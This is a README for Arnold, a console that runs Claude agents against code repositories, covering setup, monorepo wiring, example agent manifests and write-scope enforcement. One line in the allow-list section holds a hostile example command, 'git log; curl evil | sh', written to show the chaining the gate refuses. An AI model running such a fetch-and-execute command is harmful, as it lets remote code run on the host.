# Arnold

**A**gent **R**unner, **N**otary, **O**rchestrator, **L**edger, **D**ispatcher.

A console for running Claude agents against any repo. It lists the agents a
project declares in its `.claude/` directory, lets you trigger one, streams the
transcript live, and keeps a durable record of what each run cost, what code it
saw, and what it produced.

Point it at a checkout, write a manifest per agent, press Run.

| Doc                                            | What it is                                                                             |
| ---------------------------------------------- | -------------------------------------------------------------------------------------- |
| [`docs/HANDOVER.md`](docs/HANDOVER.md)         | **Start here.** What works today, what has never run, and how to get a first real run. |
| [`docs/DECISIONS.md`](docs/DECISIONS.md)       | Why the code looks like this. Read before changing anything structural.                |
| [`docs/architecture.md`](docs/architecture.md) | The plan of record, written before the code.                                           |
| [`docs/ROADMAP.md`](docs/ROADMAP.md)           | Eight phases with acceptance criteria.                                                 |

This repo is Phase 0: single app, SQLite, in-process execution, no auth.

The five words are the five modules, not decoration:

| Word             | Module                        | Job                                                                     |
| ---------------- | ----------------------------- | ----------------------------------------------------------------------- |
| **Runner**       | `packages/core/runner.ts`     | Drives the Agent SDK `query()` loop with a tool policy it cannot escape |
| **Notary**       | `packages/core/notary.ts`     | Records what code the run saw: base SHA, branch, PR, ticket keys        |
| **Orchestrator** | `packages/core/registry.ts`   | Owns the registry and the run tree (subagent and harness children)      |
| **Ledger**       | `packages/core/ledger.ts`     | Daily cost and token caps, per agent and globally                       |
| **Dispatcher**   | `packages/core/dispatcher.ts` | Validates arguments, refuses what it should, and enqueues               |

## The one contract that must survive every phase

**The API enqueues, something else executes against a leased workspace, and runs
are durable records with declared artifacts.**

Phase 0 runs the executor in-process with SQLite and an EventEmitter. Phase 1
swaps in a worker process, Postgres, and Redis. Nothing above changes, because
only the components behind that sentence get replaced.

## Getting started

```bash
nvm use                # 22.22.3
npm i -g pnpm          # if you do not have it
cp .env.example .env.local
# fill in ANTHROPIC_API_KEY and check TARGET_REPO_PATH
pnpm env:check         # confirms the env file is found before anything else runs
pnpm setup             # install, prisma generate, db push, seed
pnpm dev               # http://localhost:3000
```

`pnpm setup` seeds one repo row from `TARGET_REPO_PATH` and reconciles the
registry against that checkout's `.claude/` directory. Any command or subagent it
finds without a manifest overlay shows up as `unregistered`: visible, and not
runnable until someone declares what it may change.

### Adding more repos

`TARGET_REPO_*` seeds the **first** row only — an empty database has no console
to add a row from. After that, repositories are managed at
[/repos](http://localhost:3000/repos): add, edit, archive, restore, remove. The
switcher in the top bar scopes the Agents and Runs screens to one repo or shows
them all.

The local checkout path is probed as you type. A path that does not exist or is
not a git checkout is refused there, with the reason — the alternative is a repo
row that looks fine in the list and fails inside a workspace lease several
minutes into a run. The probe also reads the checkout's own branch and remote and
offers them as defaults.

A repo's agents come from `registry/<slug>/`, so a newly added repo has none
until that directory exists and is registered in `registry/index.ts`. Registering
a repo is what makes it a target; declaring manifests is what gives it agents.

Removal is two operations. **Archive** keeps every run, artifact and outcome and
just takes the repo out of the switcher; it is always available and reversible.
**Delete** is offered only when no run references the repo, because `Run.repoId`
is nullable and deleting a repo with history would silently detach it rather than
fail. See `docs/DECISIONS.md` #16.

> Phase 0 has no auth, and registering a repo names a filesystem path Arnold will
> clone and run agents against. Keep the console on localhost until Phase 3.

### One env file, injected twice

`.env.local` at the repo root is the only place these values live, and neither
tool finds it unaided. The Prisma CLI reads only `.env`, and only from its own
working directory or `./prisma`; Arnold's db scripts run with cwd
`packages/core`, so Prisma sees nothing and fails with
`P1012: Environment variable not found: DATABASE_URL`. Next has the opposite
problem: it reads env files from `apps/web`, not the repo root.

So two small shims inject the same file: `scripts/with-env.mjs` wraps the CLI
scripts, and `apps/web/next.config.mjs` loads it for the app. Both use Node's
built-in `process.loadEnvFile`, so there is no dotenv dependency and Windows
behaves the same as POSIX. Do not copy the values into
`packages/core/.env` or `apps/web/.env.local`; that turns one file into three.

If a db script fails, `with-env` names the missing variable and the directory it
looked in, rather than leaving you with Prisma's message about a schema line.

### Two more pieces of monorepo wiring

Both are small and both are load-bearing, so they are worth knowing before you
move files around.

**`@arnold/core` is a root dependency.** `registry/` is not a package, but its
manifests import `@arnold/core`, and Node resolves that from the importing file's
location rather than the working directory. Without the root dependency there is
no link above `registry/`, and both `pnpm seed` and the build's typecheck fail
with "Cannot find module @arnold/core". `apps/web/tsconfig.json` also maps the
path explicitly, because the build typechecks `registry/*.ts` through the import
graph using that tsconfig.

**HeroUI components that read their children must be client components.** Some
HeroUI components inspect their own children, and children created in a Server
Component are not real React elements at the point they run. `Tooltip` does
`if (!isValidElement(children)) trigger = jsx("p", {...})`, so a `Chip` inside it
becomes a `<div>` inside a `<p>`: invalid HTML and a hydration error. `Table`
uses React Aria's collection builder and throws
`Unknown element <[object Object]> in collection` outright. Neither shows up at
compile time.

`pnpm check:rsc` fails the build on that combination, and `pnpm build` runs it
first. If it flags a file, add `"use client"` as its first statement; add to the
component list in `scripts/check-rsc-boundaries.mjs` when adopting a new HeroUI
component with either behaviour.

**Webpack needs `extensionAlias`.** Core is TypeScript ESM, so its internal
imports carry the `.js` extension the emitted JavaScript would have
(`export * from "./agents.js"`). TypeScript resolves that to `agents.ts`;
webpack takes it literally and fails with "Can't resolve './agents.js'". The
`webpack()` hook in `next.config.mjs` tells it to try `.ts` and `.tsx` first.
Preferred over stripping the extensions from sixteen files, because those
extensions are what let core run under plain Node later, unbundled.

### Verifying without a database

Prisma's engine binaries are not always reachable (a sandboxed CI runner, an
offline box). Two scripts cover that case:

```bash
pnpm typecheck:offline   # generates a type stub from schema.prisma, then tsc
pnpm smoke ../example-repo   # exercises prompt rendering + tool policy for real
pnpm check:rsc           # catches the RSC/HeroUI trap below; also runs in pnpm build
```

`pnpm smoke` is the useful one. It renders every registered agent's prompt from
the actual files in a checkout and asserts the substitutions landed, then throws
a batch of tool calls at the write-scope gate and asserts the right ones are
refused. A prompt whose `<PR>` token never got substituted still runs; it just
analyses the wrong PR. That class of bug is invisible without this.

## The bundled registry is a set of examples

`registry/example-repo/` holds eight manifests written against one specific
project. That project is not the point: read them as worked examples and
templates, then add a sibling directory for your own repo and register it in
`registry/index.ts`.

They are worth reading because between them they cover every agent kind and
every write scope the model supports:

| Agent                       | Kind     | Write scope       | What it demonstrates                                                                                    |
| --------------------------- | -------- | ----------------- | ------------------------------------------------------------------------------------------------------- |
| `work-order-scoper`         | subagent | `read-only`       | A subagent promoted to direct invocation, with its caller's context block rebuilt via `contextTemplate` |
| `ai-smell-scan`             | command  | `read-only`       | `invocable: "child"` — the worker of a fan-out script, not a runnable unit on its own                   |
| `pr-loop-analyzer`          | command  | `artifacts`       | Writes exactly one report, so artifact collection has something to collect                              |
| `plan-week`                 | command  | `artifacts`       | `needs-local-session` plus `unattendedIfArgs`, and a `mainBookkeeping` grant                            |
| `pre-pr-review`             | command  | `working-tree`    | Edits code in the leased worktree with no push credential mounted                                       |
| `work-queue`                | command  | `draft-pr`        | Branches, pushes, opens draft PRs; prompt guardrails encoded as an allow-list                           |
| `fix-pr-comments`           | command  | `external-writes` | The most privileged tier, and the only `needs-human` agent                                              |
| `pr-loop-analyzer-subagent` | subagent | `external-writes` | The wider-scoped twin behind an id collision, registered so it is visible rather than silently shadowed |

**All eight are registered, but the gating they assume is not built yet.** There
is no auth, so anything reaching the port can trigger any of them, including the
ones that write to a real remote. See [`docs/HANDOVER.md`](docs/HANDOVER.md).

## The thing worth understanding before adding an agent

Every agent in `example-repo/.claude/` enforces its own limits with **prompt
text only**. Command files carry no `tools:` frontmatter at all, and the two
subagents declare unrestricted `Bash`. `ai-smell-scan` says "You have no write
tools" and `work-order-scoper` says "you do not run git write commands", and
nothing stops either of them.

Turning those sentences into a manifest allow-list plus a credential policy is
what Arnold is for. That is why every manifest carries a `scopeEnforcement`
field: it starts at `prompt-only` and the UI shows it as a warning until someone
narrows the tools. Treat it as a to-do list, not a description.

Two rules fall out of that, and both are enforced in code rather than documented
and hoped for:

- **No agent may write under `.claude/`**, at any write scope. The executor
  mounts a real checkout, so an agent editing `.claude/` would be rewriting the
  registry source that defines its own permissions. Same for `.env*`, CI config,
  and release config.
- **`Bash` allow-list entries match per command segment.** `Bash(git log*)` must
  not carry `git log; curl evil | sh`, and a redirection target goes through the
  same write-path gate as `Write` does.

## Adding an agent

1. Write it in the target repo under `.claude/commands/` or `.claude/agents/`,
   with an `argument-hint` that matches the slots the body actually reads.
2. Hit registry sync. It appears as `unregistered`.
3. Add `registry/<repo-slug>/<id>.ts` with the manifest overlay. Narrow `Bash`
   to the specific invocations the prompt runs; a bare `Bash` means the declared
   write scope is fiction.
4. Give it structured output if it has none: a fenced JSON block, a JSONL
   append, or a report at a stable path. Without one, a run is visible but not
   chartable.
5. Keep its reason codes as its own list. `plan-week` emits
   `too-large-to-split`; `work-order-scoper` emits `too-large`. Merging the
   vocabularies splits one concept across two labels in every chart.
6. Dry-run it once with `permissionMode: "plan"` and read the transcript before
   letting anyone else press the button.

## Layout

```
arnold/
  packages/core/          types, store, and every runtime module
    prisma/schema.prisma  SQLite in Phase 0, Postgres in Phase 1
    src/agents.ts         the manifest contract; read this first
  registry/               manifest overlays, one directory per repo
    example-repo/
  apps/web/               Next.js: UI + API routes + the SSE relay
  scripts/                seed, smoke test, offline type stub
```

`packages/core/src/agents.ts` is the file to read first. Everything else reads
from it.

## Licence

MIT. See [`LICENSE`](LICENSE).
